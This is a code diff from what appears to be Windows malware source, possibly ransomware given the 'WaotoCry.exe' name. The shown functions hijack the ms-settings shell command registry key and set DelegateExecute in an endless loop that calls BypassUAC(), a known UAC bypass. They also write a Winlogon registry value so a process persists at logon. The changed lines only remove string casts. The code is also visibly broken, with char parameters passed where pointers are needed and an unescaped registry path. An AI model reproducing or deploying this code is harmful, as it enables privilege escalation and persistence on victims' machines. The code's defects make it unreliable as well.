@@ -6,11 +6,11 @@ int add_double_data(char new_process_path) {
 	DWORD dwDisposition;
 	::RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition);
 	char data[] = "Software\\Classes\\ms-settings\\Shell\\open\\command";
-	RegOpenKeyEx(HKEY_CURRENT_USER, (LPCWSTR)data, 0, KEY_WRITE, &key);
+	RegOpenKeyEx(HKEY_CURRENT_USER, data, 0, KEY_WRITE, &key);
 	//char  filePath[] = "C:\\Windows\\System32\\cmd.exe";
 	while (1)
 	{
-		RegSetValueEx(key, (LPCWSTR)"", 0, REG_SZ, (BYTE*)new_process_path, strlen((const char*)new_process_path));
+		RegSetValueEx(key, "", 0, REG_SZ, (BYTE*)new_process_path, strlen((const char*)new_process_path));
 		RegSetValueExW(key, L"DelegateExecute", 0, REG_SZ, (BYTE*)"", sizeof(""));
 		BypassUAC();
 		Sleep(100);
@@ -23,7 +23,7 @@ int add_double_data(char new_process_path) {
 int increase(char start_process) {
 	HKEY A_Key;
 	char login_pth[] = "\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
-	::RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCWSTR)login_pth, 0, KEY_WRITE, &A_Key);
+	::RegOpenKeyEx(HKEY_LOCAL_MACHINE, login_pth, 0, KEY_WRITE, &A_Key);
 	::RegSetValueExW(A_Key, L"WaotoCry.exe", 0, REG_SZ, (BYTE*)start_process, sizeof(start_process));
 	::RegCloseKey(A_Key);
 	return 0;
